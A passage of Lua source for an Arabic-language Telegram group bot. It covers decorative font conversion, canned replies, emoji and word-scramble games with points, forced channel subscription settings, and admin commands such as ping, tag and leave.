"ᵃ,ᵇ,ᶜ,ᵈ,ᵉ,ᶠ,ᵍ,ʰ,ᶤ,ʲ,ᵏ,ˡ,ᵐ,ᶰ,ᵒ,ᵖ,ᵠ,ʳ,ˢ,ᵗ,ᵘ,ᵛ,ʷ,ˣ,ʸ,ᶻ,ᵃ,ᵇ,ᶜ,ᵈ,ᵉ,ᶠ,ᵍ,ʰ,ᶤ,ʲ,ᵏ,ˡ,ᵐ,ᶰ,ᵒ,ᵖ,ᵠ,ʳ,ˢ,ᵗ,ᵘ,ᵛ,ʷ,ˣ,ʸ,ᶻ,0,9,8,7,6,5,4,3,2,1,.,_",     
"ᴀ,ʙ,ᴄ,ᴅ,ᴇ,ғ,ɢ,ʜ,ɪ,ᴊ,ᴋ,ʟ,ᴍ,ɴ,ᴏ,ᴘ,ǫ,ʀ,ѕ,ᴛ,ᴜ,ᴠ,ᴡ,х,ʏ,ᴢ,ᴀ,ʙ,ᴄ,ᴅ,ᴇ,ғ,ɢ,ʜ,ɪ,ᴊ,ᴋ,ʟ,ᴍ,ɴ,ᴏ,ᴘ,ǫ,ʀ,ѕ,ᴛ,ᴜ,ᴠ,ᴡ,х,ʏ,ᴢ,0,9,8,7,6,5,4,3,2,1,.,_",     
"Ａ,Ｂ,С,Ｄ,Ｅ,Բ,Ｇ,Ｈ,Ｉ,Ｊ,Ｋ,Ｌ,Ⅿ,Ｎ,Ｏ,Ｐ,Ｑ,Ｒ,Ｓ,Ｔ,Ｕ,Ｖ,Ｗ,Ｘ,Ｙ,Ｚ,Ａ,Ｂ,С,Ｄ,Ｅ,Բ,Ｇ,Ｈ,Ｉ,Ｊ,Ｋ,Ｌ,Ⅿ,Ｎ,Ｏ,Ｐ,Ｑ,Ｒ,Ｓ,Ｔ,Ｕ,Ｖ,Ｗ,Ｘ,Ｙ,Ｚ,0,9,8,7,6,5,4,3,2,1,.,_",     
"Λ,Б,Ͼ,Ð,Ξ,Ŧ,₲,Ḧ,ł,J,К,Ł,Ɱ,Л,Ф,Ꝓ,Ǫ,Я,Ŝ,₮,Ǚ,Ṽ,Ш,Ж,Ẏ,Ꙃ,Λ,Б,Ͼ,Ð,Ξ,Ŧ,₲,Ḧ,ł,J,К,Ł,Ɱ,Л,Ф,Ꝓ,Ǫ,Я,Ŝ,₮,Ǚ,Ṽ,Ш,Ж,Ẏ,Ꙃ,0,9,8,7,6,5,4,3,2,1,.,_",     }         
local result = {}     
i=0     
for k=1,#fonts do     
i=i+1     
local tar_font = fonts[i]:split(",")     
local text = bot    
local text = text:gsub("A",tar_font[1])     
local text = text:gsub("B",tar_font[2])     
local text = text:gsub("C",tar_font[3])     
local text = text:gsub("D",tar_font[4])     
local text = text:gsub("E",tar_font[5])     
local text = text:gsub("F",tar_font[6])  
local text = text:gsub("G",tar_font[7])    
local text = text:gsub("H",tar_font[8])    
local text = text:gsub("I",tar_font[9])     
local text = text:gsub("J",tar_font[10])     
local text = text:gsub("K",tar_font[11])     
local text = text:gsub("L",tar_font[12])     
local text = text:gsub("M",tar_font[13])     
local text = text:gsub("N",tar_font[14])     
local text = text:gsub("O",tar_font[15])     
local text = text:gsub("P",tar_font[16])     
local text = text:gsub("Q",tar_font[17])     
local text = text:gsub("R",tar_font[18])     
local text = text:gsub("S",tar_font[19])     
local text = text:gsub("T",tar_font[20])     
local text = text:gsub("U",tar_font[21])     
local text = text:gsub("V",tar_font[22])     
local text = text:gsub("W",tar_font[23])     
local text = text:gsub("X",tar_font[24])     
local text = text:gsub("Y",tar_font[25])     
local text = text:gsub("Z",tar_font[26])     
local text = text:gsub("a",tar_font[27])     
local text = text:gsub("b",tar_font[28])     
local text = text:gsub("c",tar_font[29])     
local text = text:gsub("d",tar_font[30])     
local text = text:gsub("e",tar_font[31])     
local text = text:gsub("f",tar_font[32])     
local text = text:gsub("g",tar_font[33])     
local text = text:gsub("h",tar_font[34])     
local text = text:gsub("i",tar_font[35])     
local text = text:gsub("j",tar_font[36])     
local text = text:gsub("k",tar_font[37])     
local text = text:gsub("l",tar_font[38])     
local text = text:gsub("m",tar_font[39])     
local text = text:gsub("n",tar_font[40])     
local text = text:gsub("o",tar_font[41])     
local text = text:gsub("p",tar_font[42])     
local text = text:gsub("q",tar_font[43])     
local text = text:gsub("r",tar_font[44])     
local text = text:gsub("s",tar_font[45])     
local text = text:gsub("t",tar_font[46])     
local text = text:gsub("u",tar_font[47])     
local text = text:gsub("v",tar_font[48])     
local text = text:gsub("w",tar_font[49])     
local text = text:gsub("x",tar_font[50])     
local text = text:gsub("y",tar_font[51])     
local text = text:gsub("z",tar_font[52])     
local text = text:gsub("0",tar_font[53])     
local text = text:gsub("9",tar_font[54])     
local text = text:gsub("8",tar_font[55])     
local text = text:gsub("7",tar_font[56])     
local text = text:gsub("6",tar_font[57])     
local text = text:gsub("5",tar_font[58])     
local text = text:gsub("4",tar_font[59])     
local text = text:gsub("3",tar_font[60])     
local text = text:gsub("2",tar_font[61])     
local text = text:gsub("1",tar_font[62])            
table.insert(result, text)     
end     
local bot22 = "🌿⁞ الكلمه "..bot.." •\n🍄⁞ تم زخرفتها {"..tostring(#fonts).."} نوع •\n✨⁞ اضغط على الكلمه لنسخها •\n\n"
number=0     
for v=1,#result do     
number=number+1     
local bot = { '🔥', '🔅﴿', '❥˓ ', '💝﴿', '🐼🌿', '🙊💙', '🐥✨', '😻‘','⚡️', '⁽🌷', '🔥“', '💭', '🍿','🐼💗 ', '🐝🍷','❥̚͢₎🐣', '👄‘', ' 💭ۦ',' 🎉ۦ', ' ⚡️ۦ','℡̈', '💋☄️₎ۦ˛', '♩',' ☻🔥“ٰۦ', '℡ ̇ ✨🐯⇣✦', '⁞♩⁽💎🌩₎⇣✿','ٰ❥ ͢ۦ‏', '⚡️ֆ₎', '🐰☄️', '⁾❥', '✿🎃❥', '✿⇣', '❥℡🦁' }     
bot22 = bot22..''..number.." • `"..result[number]..''..bot[math.random(#bot)].."`\n\n"    
end     
botdx(msg.chat_id_, 0, 1, bot22, 1, 'md')     
end     
end 
---------------------------------------------bot----------------------------------------------------------
if botx1:get(BOT.."bot:nerkh" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then
botx1:del(BOT.."bot:nerkh" .. msg.chat_id_ .. ":" .. msg.sender_user_id_)
local nerkh = msg.content_.text_:match("(.*)")
botx1:set(BOT.."nerkh", nerkh)
if botx1:get(BOT.."lang:gp:" .. msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, "🚦⁞ Bot *sudo* has been *Setted* •", 1, "md")
else
botdx(msg.chat_id_, msg.id_, 1, "🎖 ⁞ تم حفظ كليشه المطور •", 1, "md")
end
end 
----------------------------------------bot---------------------------------------------------------------
if botx1:get(BOT..'bot:cmds'..msg.chat_id_) and not is_momod(msg.sender_user_id_, msg.chat_id_) then
print("Return False [Lock] [Cmd]")
return false
else  
--------------------------------------bot
if text == 'دي' or text == 'دي لك' then 
if not botx1:get(BOT..'bot:rep:mute'..msg.chat_id_) then
bot =  "يـٰ̲ـہمـٰ̲ـہشـٰ̲ـہوٰكـٰ̲ـہ بـٰ̲ـہيـٰ̲ـہهـٰ̲ـہاٰ حـٰ̲ـہيـٰ̲ـہوٰاٰنـٰ̲ـہ ♯⋮ֆ🗡🦁"
else 
bot = ''
end
botdx(msg.chat_id_, msg.id_, 1, bot, 1, 'md')
end
if text == 'سلام' or text == 'السلام عليكم' or text == 'سلام عليكم' then 
if not botx1:get(BOT..'bot:rep:mute'..msg.chat_id_) then
bot =  "عٰہٰٖلہٰٖيٰہٰٖكٰہٰٖمٰہٰٖ اٰلہٰٖسٰہٰٖلہٰٖاٰمٰہٰٖ اٰغٰہٰٖاٰتٰہٰٖيٰہٰٖ ❊😼🎶ֆ"
else 
bot = ''
end
botdx(msg.chat_id_, msg.id_, 1, bot, 1, 'md')
end
if text == '😭💔' or text == '😭😭' or text == '😭😭😭' or text == '😿💔' or text == '??😭' or text == '😭😭😭' or text == '😭😭😭😭' then      
if not botx1:get(BOT..'bot:rep:mute'..msg.chat_id_) then
bot =  "لتَہَٰبّہجْۧيِٰہ حہٰٰيِٰہآتَہَٰيِٰہ ف͒ہٰٰديِٰہتَہَٰڪٰྀہٰٰٖ ║😿 ₍♚⁾??"
else 
bot = ''
end 
botdx(msg.chat_id_, msg.id_, 1, bot, 1, 'md')
end
if text == '🌚💔' or text == '💔🌚' or text == '🚶‍♂💔' or text == '💔' or text == '😔💔' or text == '🚶‍♀💔' or text == '😭' then      
if not botx1:get(BOT..'bot:rep:mute'..msg.chat_id_) then
bot =  "تَہَٰ؏ۤـہآل آشِٰہٰٰڪٰྀہٰٰٖيِٰہليِٰہ ٰ̲ھہمٰ̲ہوِمٰ̲ہڪٰྀہٰٰٖ ⁞✦⁽😭🔥₎“ٰۦ"
else 
bot = ''
end 
botdx(msg.chat_id_, msg.id_, 1, bot, 1, 'md')
end
if text == 'باي' or text == 'بااي' or text == 'اروح' or text == 'اروح احسن' or text == 'اولي احسن' or text == 'راح اروح' or text == 'باي انام' then      
if not botx1:get(BOT..'bot:rep:mute'..msg.chat_id_) then
bot =  "خ̲ـꨩﮧلٍُـّٰ̐ہيـِٰ̲ﮧكـِّﮧْٰٖ دٰཻا ཻاضـٰ๋۪͜ﮧٰح̲ꪳـﮧكـِّﮧْٰٖ عـ͜ާﮧْلٍُـّٰ̐ہيـِٰ̲ﮧكـِّﮧْٰٖ ⩩ཻ🌞ֆ﴾"
else 
bot = ''
end 
botdx(msg.chat_id_, msg.id_, 1, bot, 1, 'md')
end
if text == 'هلو' or text == 'هلاو' or text == 'هلا' or text == 'هلاوو' or text == 'هيلاو' or text == 'هيلاوو' or text == 'هلاا' then      
if not botx1:get(BOT..'bot:rep:mute'..msg.chat_id_) then
bot =  "♛#ֆ‘﴾ۗ ʟ̤ɾʅ᎗̣ɹᓗ ᎗̈ɹȊg⅃᎗බ"
else 
bot = ''
end 
botdx(msg.chat_id_, msg.id_, 1, bot, 1, 'md')
end
if text == 'شونك' or text == 'شونج' or text == 'شلونك' or text == 'شلونج' or text == 'شونكم' or text == 'شلونكم' or text == 'شلخبار' then      
if not botx1:get(BOT..'bot:rep:mute'..msg.chat_id_) then
bot =  "آنَِٰہيِٰہ تَہَٰمٰ̲ہآمٰ̲ہ آنَِٰہتَہَٰ شِٰہٰٰلوِنَِٰہڪٰྀہٰٰٖ  ⁽࿑♚꫶😼ֆ﴾"
else 
bot = ''
end 
botdx(msg.chat_id_, msg.id_, 1, bot, 1, 'md')
end
if text == 'وينك' or text == 'وينج' then 
if not botx1:get(BOT..'bot:rep:mute'..msg.chat_id_) then
bot =  "عـٰ̲ـہوٰفـٰ̲ـہنـٰ̲ـہيـٰ̲ـہ جـٰ̲ـہاٰيـٰ̲ـہ اٰزٰحـٰ̲ـہفـٰ̲ـہ 🐼⚡️ֆ‘﴾"
else 
bot = ''
end 
botdx(msg.chat_id_, msg.id_, 1, bot, 1, 'md')
end
if text == 'نايمين' or text == 'ميتين' then 
if not botx1:get(BOT..'bot:rep:mute'..msg.chat_id_) then
bot =  "آنَِٰہيِٰہ ڪٰྀہٰٰٖآ؏ۤـہد آحہٰٰرسٰٰٓڪٰྀہٰٰٖمٰ̲ہ ℡̮⇣┆👑😻⇣ۦ"
else 
bot = ''
end 
botdx(msg.chat_id_, msg.id_, 1, bot, 1, 'md')
end
if text == 'اكلك' or text == 'اكلج' then 
if not botx1:get(BOT..'bot:rep:mute'..msg.chat_id_) then
bot =  "ཻاٰ̲ھہﯛ૭ ب̲ꪰـﮧدٰتـٰۧﮧ ཻالٍُـّٰ̐ہكـِّﮧْٰٖرٰཻاﯛ૭يـِٰ̲ﮧ ཻالٍُـّٰ̐ہتـٰۧﮧعـ͜ާﮧْب̲ꪰـﮧཻانٰ̲̐ـﮧْٰ̲ھہ 卍🙃♛⁽ ֆ ̯͡“"
else 
bot = ''
end 
botdx(msg.chat_id_, msg.id_, 1, bot, 1, 'md')
end
if text == 'ها' or text == 'هاا' then 
if not botx1:get(BOT..'bot:rep:mute'..msg.chat_id_) then
bot =  "ۿۿہآ رديِٰـﮧِۢنِٰـﮧِۢۿۿہ لِٰـِﮧۢﯛ̲୭ لِٰـِﮧۢآ ₎⇣🌚🔥 ⁞₎⇣"
else 
bot = ''
end
botdx(msg.chat_id_, msg.id_, 1, bot, 1, 'md')
end
if text == 'سورس رامي' or text == 'هذا سورس منو' then 
if not botx1:get(BOT..'bot:rep:mute'..msg.chat_id_) then
bot =  "لآ سٰٰٓوِرسٰٰٓ خٰ̐ہآلتَہَٰڪٰྀہٰٰٖ ديِٰہ لڪٰྀہٰٰٖ ┋՞❁ 🌞?? ﴾"
else 
bot = ''
end
botdx(msg.chat_id_, msg.id_, 1, bot, 1, 'md')
end
if text == 'رامي' or text == 'وين رامي' then 
if not botx1:get(BOT..'bot:rep:mute'..msg.chat_id_) then
bot =  "؏ۤـہوِف͒ہٰٰ مٰ̲ہطۨہٰٰوِريِٰہ مٰ̲ہآ ف͒ہٰٰآرغہٰٰلڪٰྀہٰٰٖ ┊ާ͢🌚🔥₎⇣"
else 
bot = ''
end
botdx(msg.chat_id_, msg.id_, 1, bot, 1, 'md')
end
if text == 'بوت' or text == 'هذا بوت' then 
if not botx1:get(BOT..'bot:rep:mute'..msg.chat_id_) then
bot =  "؏ۤـہيِٰہوِنَِٰہٰ̲ھہ آل؏ۤـہسٰٰٓليِٰہآتَہَٰ ❊😼🎶ֆ"
else 
bot = ''
end
botdx(msg.chat_id_, msg.id_, 1, bot, 1, 'md')
end
if text =='نقاطي' then 
if tonumber((botx1:get(BOT..'bot:add:num'..msg.chat_id_..msg.sender_user_id_) or 0)) == 0 then
bot0 = '❌ ⁞ ليس لديك نقاط العب اولا •\n🚦⁞ للعب ارسل { سمايلات او ترتيب } •'
botdx(msg.chat_id_, msg.id_, 1,bot0, 1, 'md')
else 
bot = '🚦⁞ لديك ('..(botx1:get(BOT..'bot:add:num'..msg.chat_id_..msg.sender_user_id_))..') نقطه •'
botdx(msg.chat_id_, msg.id_, 1,bot, 1, 'md')
end
end
if text ==  'مسح رسائلي' then
botx1:del('bot:'..bot_id..'nummsg'..msg.chat_id_..msg.sender_user_id_)
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم مسح رسائلك المضافه •', 1, 'md')
end
if text == 'سمايلات' and botx1:get(BOT..'bot:lock_geam'..msg.chat_id_) then
botx1:del(BOT..'bot:l:ids'..msg.chat_id_)
katu = {'🍏','🍎','🍐','🍊','🍋','🍌','🍉','🍇','🍓','🍈','🍒','🍑','🍍','🥥','🥝','🍅','🍆','🥑','🥦','🥒','🌶','🌽','🥕','🥔','🍠','🥐','🍞','🥖','🥨','🧀','🥚','🍳','🥞','🥓','🥩','🍗','🍖','🌭','🍔','🍟','🍕','🥪','🥙','🍼','☕️','🍵','🥤','🍶','🍺','🍻','🏀','⚽️','🏈','⚾️','🎾','🏐','🏉','🎱','🏓','🏸','🥅','🎰','🎮','🎳','🎯','🎲','🎻','🎸','🎺','🥁','🎹','🎼','🎧','🎤','🎬','🎨','🎭','🎪','🎟','🎫','🎗','🏵','🎖','🏆','🥌','🛷','🚕','🚗','🚙','🚌','🚎','🏎','🚓','🚑','🚚','🚛','🚜','🇮🇶','⚔️','🛡','🔮','🌡','💣','📌','📍','📓','📗','📂','📅','📪','📫','📬','📭','⏰','📺','🎚','☎️','📡'}
name = katu[math.random(#katu)]
botx1:set(BOT..'bot:klmos'..msg.chat_id_,name)
name = string.gsub(name,'🍞','🍞')
name = string.gsub(name,'🥖','🥖')
name = string.gsub(name,'🥨','🥨')
name = string.gsub(name,'🧀','🧀')
name = string.gsub(name,'🥚','🥚')
name = string.gsub(name,'🍳','🍳')
name = string.gsub(name,'🥞','🥞')
name = string.gsub(name,'🥓','🥓')
name = string.gsub(name,'🥩','🥩')
name = string.gsub(name,'🍗','🍗')
name = string.gsub(name,'🍖','🍖')
name = string.gsub(name,'🌭','🌭')
name = string.gsub(name,'🍔','🍔')
name = string.gsub(name,'🍟','🍟')
name = string.gsub(name,'🍕','🍕')
name = string.gsub(name,'🥪','🥪')
name = string.gsub(name,'🥙','🥙')
name = string.gsub(name,'🍼','🍼')
name = string.gsub(name,'☕️','☕️')
name = string.gsub(name,'🍵','🍵')
name = string.gsub(name,'🥤','🥤')
name = string.gsub(name,'🍶','🍶')
name = string.gsub(name,'🍺','🍺')
name = string.gsub(name,'🍏','🍏')
name = string.gsub(name,'🍎','🍎')
name = string.gsub(name,'🍐','🍐')
name = string.gsub(name,'🍊','🍊')
name = string.gsub(name,'🍋','🍋')
name = string.gsub(name,'🍌','🍌')
name = string.gsub(name,'🍉','🍉')
name = string.gsub(name,'🍇','🍇')
name = string.gsub(name,'🍓','🍓')
name = string.gsub(name,'🍈','🍈')
name = string.gsub(name,'🍒','🍒')
name = string.gsub(name,'🍑','🍑')
name = string.gsub(name,'🍍','🍍')
name = string.gsub(name,'🥥','🥥')
name = string.gsub(name,'🥝','🥝')
name = string.gsub(name,'🍅','🍅')
name = string.gsub(name,'🍆','🍆')
name = string.gsub(name,'🥑','🥑')
name = string.gsub(name,'🥦','🥦')
name = string.gsub(name,'🥒','🥒')
name = string.gsub(name,'🌶','🌶')
name = string.gsub(name,'🌽','🌽')
name = string.gsub(name,'🥕','🥕')
name = string.gsub(name,'🥔','🥔')
name = string.gsub(name,'🍠','🍠')
name = string.gsub(name,'🥐','🥐')
name = string.gsub(name,'🍻','🍻')
name = string.gsub(name,'🏀','🏀')
name = string.gsub(name,'⚽️','⚽️')
name = string.gsub(name,'🏈','🏈')
name = string.gsub(name,'⚾️','⚾️')
name = string.gsub(name,'🎾','🎾')
name = string.gsub(name,'🏐','🏐')
name = string.gsub(name,'🏉','??')
name = string.gsub(name,'🎱','🎱')
name = string.gsub(name,'🏓','🏓')
name = string.gsub(name,'🏸','🏸')
name = string.gsub(name,'🥅','🥅')
name = string.gsub(name,'🎰','🎰')
name = string.gsub(name,'🎮','🎮')
name = string.gsub(name,'🎳','🎳')
name = string.gsub(name,'🎯','🎯')
name = string.gsub(name,'🎲','🎲')
name = string.gsub(name,'🎻','🎻')
name = string.gsub(name,'🎸','🎸')
name = string.gsub(name,'🎺','🎺')
name = string.gsub(name,'🥁','🥁')
name = string.gsub(name,'🎹','🎹')
name = string.gsub(name,'🎼','🎼')
name = string.gsub(name,'🎧','🎧')
name = string.gsub(name,'🎤','🎤')
name = string.gsub(name,'🎬','🎬')
name = string.gsub(name,'🎨','🎨')
name = string.gsub(name,'🎭','🎭')
name = string.gsub(name,'🎪','🎪')
name = string.gsub(name,'🎟','🎟')
name = string.gsub(name,'🎫','🎫')
name = string.gsub(name,'🎗','🎗')
name = string.gsub(name,'🏵','🏵')
name = string.gsub(name,'🎖','🎖')
name = string.gsub(name,'🏆','🏆')
name = string.gsub(name,'🥌','🥌')
name = string.gsub(name,'🛷','🛷')
name = string.gsub(name,'🚕','🚕')
name = string.gsub(name,'🚗','🚗')
name = string.gsub(name,'🚙','🚙')
name = string.gsub(name,'🚌','🚌')
name = string.gsub(name,'🚎','🚎')
name = string.gsub(name,'🏎','🏎')
name = string.gsub(name,'🚓','🚓')
name = string.gsub(name,'🚑','🚑')
name = string.gsub(name,'🚚','??')
name = string.gsub(name,'🚛','🚛')
name = string.gsub(name,'🚜','🚜')
name = string.gsub(name,'🇮🇶','🇮🇶')
name = string.gsub(name,'⚔️','⚔️')
name = string.gsub(name,'🛡','🛡')
name = string.gsub(name,'🔮','🔮')name = string.gsub(name,'🌡','🌡')
name = string.gsub(name,'💣','💣')
name = string.gsub(name,'📌','📌')
name = string.gsub(name,'📍','📍')
name = string.gsub(name,'📓','📒')
name = string.gsub(name,'📗','📗')
name = string.gsub(name,'📂','🗂')
name = string.gsub(name,'📅','📆')
name = string.gsub(name,'📪','📪')
name = string.gsub(name,'📫','📫')
name = string.gsub(name,'📬','📬')
name = string.gsub(name,'📭','📭')
name = string.gsub(name,'⏰','⏰')
name = string.gsub(name,'📺','📺')
name = string.gsub(name,'🎚','🎚')
name = string.gsub(name,'☎️','☎️')
bot = '🚦⁞ اول واحد يدز هذا السمايل  {'..name..'} يربح •'
botdx(msg.chat_id_, msg.id_, 1,bot, 1, 'md')
end
if text == ''..(botx1:get(BOT..'bot:klmos'..msg.chat_id_) or 'لفاتع')..'' and not botx1:get(BOT..'bot:l:ids'..msg.chat_id_) then
if not botx1:get(BOT..'bot:l:ids'..msg.chat_id_) then 
bot = '🚦⁞ انت الرابح • \n🚦⁞ للعب مره اخرى ارسل سمايلات •'
botdx(msg.chat_id_, msg.id_, 1,bot, 1, 'md')
botx1:incrby(BOT..'bot:add:num'..msg.chat_id_..msg.sender_user_id_, 1)  
end
botx1:set(BOT..'bot:l:ids'..msg.chat_id_,true)
end
if text == 'ترتيب' and botx1:get(BOT..'bot:lock_geam'..msg.chat_id_) then
botx1:del(BOT..'bot:l:id'..msg.chat_id_)
katu = {'سحور','سياره','استقبال','قنفه','ايفون','بزونه','مطبخ','كرستيانو','دجاجه','مدرسه','الوان','غرفه','ثلاجه','كهوه','سفينه','العراق','محطه','طياره','رادار','منزل','مستشفى','كهرباء','تفاحه','اخطبوط','سلمون','فرنسا','برتقاله','تفاح','مطرقه','بتيته','لهانه','شباك','باص','سمكه','ذباب','تلفاز','حاسوب','انترنيت','ساحه','جسر'};
name = katu[math.random(#katu)]
botx1:set(BOT..'bot:klmo'..msg.chat_id_,name)
name = string.gsub(name,'سحور','س ر و ح')
name = string.gsub(name,'سياره','ه ر س ي ا')
name = string.gsub(name,'استقبال','ل ب ا ت ق س ا')
name = string.gsub(name,'قنفه','ه ق ن ف')
name = string.gsub(name,'ايفون','و ن ف ا')
name = string.gsub(name,'بزونه','ز و ه ن')
name = string.gsub(name,'مطبخ','خ ب ط م')
name = string.gsub(name,'كرستيانو','س ت ا ن و ك ر ي')
name = string.gsub(name,'دجاجه','ج ج ا د ه')
name = string.gsub(name,'مدرسه','ه م د ر س')
name = string.gsub(name,'الوان','ن ا و ا ل')
name = string.gsub(name,'غرفه','غ ه ر ف')
name = string.gsub(name,'ثلاجه','ج ه ت ل ا')
name = string.gsub(name,'كهوه','ه ك ه و')
name = string.gsub(name,'سفينه','ه ن ف ي س')
name = string.gsub(name,'العراق','ق ع ا ل ر ا')
name = string.gsub(name,'محطه','ه ط م ح')
name = string.gsub(name,'طياره','ر ا ط ي ه')
name = string.gsub(name,'رادار','ر ا ر ا د')
name = string.gsub(name,'منزل','ن ز م ل')
name = string.gsub(name,'مستشفى','ى ش س ف ت م')
name = string.gsub(name,'كهرباء','ر ب ك ه ا ء')
name = string.gsub(name,'تفاحه','ح ه ا ت ف')
name = string.gsub(name,'اخطبوط','ط ب و ا خ ط')
name = string.gsub(name,'سلمون','ن م و ل س')
name = string.gsub(name,'فرنسا','ن ف ر س ا')
name = string.gsub(name,'برتقاله','ر ت ق ب ا ه ل')
name = string.gsub(name,'تفاح','ح ف ا ت')
name = string.gsub(name,'مطرقه','ه ط م ر ق')
name = string.gsub(name,'بتيته','ب ت ت ي ه')
name = string.gsub(name,'لهانه','ه ن ل ه ل')
name = string.gsub(name,'شباك','ب ش ا ك')
name = string.gsub(name,'باص','ص ا ب')
name = string.gsub(name,'سمكه','ك س م ه')
name = string.gsub(name,'ذباب','ب ا ب ذ')
name = string.gsub(name,'تلفاز','ت ف ل ز ا')
name = string.gsub(name,'حاسوب','س ا ح و ب')
name = string.gsub(name,'انترنيت','ا ت ن ر ن ي ت')
name = string.gsub(name,'ساحه','ح ا ه س')
name = string.gsub(name,'جسر','ر ج س')
bot = '🚦⁞ اول واحد يرتبها  {'..name..'} يربح •'
botdx(msg.chat_id_, msg.id_, 1,bot, 1, 'md')
end
if text == ''..(botx1:get(BOT..'bot:klmo'..msg.chat_id_) or 'لفاتع')..'' and not botx1:get(BOT..'bot:l:id'..msg.chat_id_) then
if not botx1:get(BOT..'bot:l:id'..msg.chat_id_) then 
bot = '🚦⁞ انت الرابح • \n🚦⁞ للعب مره اخرى ارسل ترتيب •'
botdx(msg.chat_id_, msg.id_, 1,bot, 1, 'md')
botx1:incrby(BOT..'bot:add:num'..msg.chat_id_..msg.sender_user_id_, 1)  
end
botx1:set(BOT..'bot:l:id'..msg.chat_id_,true)
end
if text == 'بيع نقاطي' then
if tonumber((botx1:get(BOT..'bot:add:num'..msg.chat_id_..msg.sender_user_id_) or 0)) == 0 then
bot0 = '❌ ⁞ ليس لديك نقاط العب اولا •\n🚦⁞ للعب ارسل { سمايلات او ترتيب } •'
botdx(msg.chat_id_, msg.id_, 1,bot0, 1, 'md')
else
bot0 = (botx1:get(BOT..'bot:add:num'..msg.chat_id_..msg.sender_user_id_) * tonumber(botx1:get('bot:'..bot_id..'gamepoint' .. msg.chat_id_)or 50))
botx1:incrby('bot:'..bot_id..'nummsg'..msg.chat_id_..msg.sender_user_id_,bot0)  
botx1:del(BOT..'bot:add:num'..msg.chat_id_..msg.sender_user_id_)
bot0 = tonumber((botx1:get('bot:'..bot_id..'gamepoint' .. msg.chat_id_) or 50))
botdx(msg.chat_id_, msg.id_, 1,'☑️⁞ تم بيع نقاطك •\n🚦⁞ كل نقطه تساوي  '..bot0..' رساله •', 'md')
end
end
if text == "تعيين قناة الاشتراك" or text == "تغيير قناة الاشتراك" then
if not is_leader(msg) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ للمطور الاساسي فقط •', 1, 'md')
else
botx1:setex(BOT..'bot4'..msg.sender_user_id_,300,true)
botdx(msg.chat_id_,msg.id_, 1, "*🌿╿❯ ارسل لي معرف قناة الاشتراك •*\n", 1 , "md")
end end
if text == 'تفعيل الاشتراك الاجباري' then
if not is_leader(msg) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ للمطور الاساسي فقط •', 1, 'md')
else
if not botx1:get(BOT..'bot3') then
botdx(msg.chat_id_,msg.id_, 1, "*🌿╿❯ لم يتم تعيين القناة •\n🍄╽❯ ارسل تعيين قناة الاشتراك •*", 1 , "md")
return false 
end
if botx1:get(BOT..'bot3') then
botdx(msg.chat_id_,msg.id_, 1, "*🌿╿❯ تم تفعيل الاشتراك الاجباري •\n☑️╽❯ قم برفعي ادمن في قناتك •*", 1 , "md")
botx1:set(BOT.."bot2", true)
return false end end end
if text == 'تعطيل الاشتراك الاجباري' then
if not is_leader(msg) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ للمطور الاساسي فقط •', 1, 'md')
else
botdx(msg.chat_id_,msg.id_, 1, "*🌿╿❯ تم تعطيل الاشتراك الاجباري •*\n", 1 , "md")
botx1:del(BOT.."bot2")
return false 
end end
if text == 'جلب قناة الاشتراك' or text == 'قناة الاشتراك' then
if not is_leader(msg) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ للمطور الاساسي فقط •', 1, 'md')
else
local bot5 = botx1:get(BOT.."bot3")
if bot5 then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ *قناة الاشتراك* : ['..bot5..']', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ لم يتم تعيين القناة •', 1, 'md')
end end end
------------------------------------ With Pattern bot-------------------------------------------
if text:match("^[Ll]ink$") or text:match("^الرابط$") then
local link = botx1:get(BOT.."bot:group:link"..msg.chat_id_)
if link then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, "🚦⁞ Group link 📬  • \n " .. link, 1, "html")
else
botdx(msg.chat_id_, msg.id_, 1, "*🌿╿❯ رابط مجموعه ⏬*\n*🏝┊❯ « "..title_name(msg.chat_id_).." »*\n\n📌╽❯  " .. link, 1, "md")
end
else
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Group link is not set ! \n Plese send command Setlink and set it  •', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ لم يتم حفظ رابط المجموعه ارسل لي (ضع رابط) ليتم حفظه 📥', 1, 'md')
end
end
end
end
----------bot
if text == 'رفع المشرفين' then  
local function promote_admin(extra, result, success)  
local num = 0
local admins = result.members_  
for i=0 , #admins do   
num = num + 1
botx1:sadd(BOT..'bot:momod:'..msg.chat_id_, admins[i].user_id_)   
if result.members_[i].status_.ID == "ChatMemberStatusCreator" then  
owner_id = admins[i].user_id_  
botx1:sadd(BOT..'bot:monsh:'..msg.chat_id_,owner_id)   
end  
end  
botdx(msg.chat_id_, msg.id_, 1, '\n*🚦⁞ تم رفع «'..num..'» ادمنيه هنا •\n🚏⁞ وتم رفع منشئ المجموعه •*', 1, 'md')
end
getChannelMembers(msg.chat_id_,0, 'Administrators', 100, promote_admin)
end
-------------bot
if is_momod(msg.sender_user_id_, msg.chat_id_) then
if text:match("^[Pp]ing$") or text:match("^فحص$") then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Bot is now Online •', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ البوت شغال عزيزي • ', 1, 'md')
end
end
end
if text:match("^تاك (.*)$")  then
local txt = {string.match(text, "^(تاك) (.*)$")}
botdx(msg.chat_id_,0, 1, txt[2], 1, 'md')
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
end
------------------------------------bot-----------------------------------------------------------
if is_admin(msg.sender_user_id_, msg.chat_id_) then
if text:match("^[Ll]eave$") or text:match("^غادر$") then
chat_leave(msg.chat_id_, bot_id)
botx1:srem(BOT.."bot:groups",msg.chat_id_)
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ طبكم مرض راح اغادر باي •', 1, 'md')
end
end
--------------bot
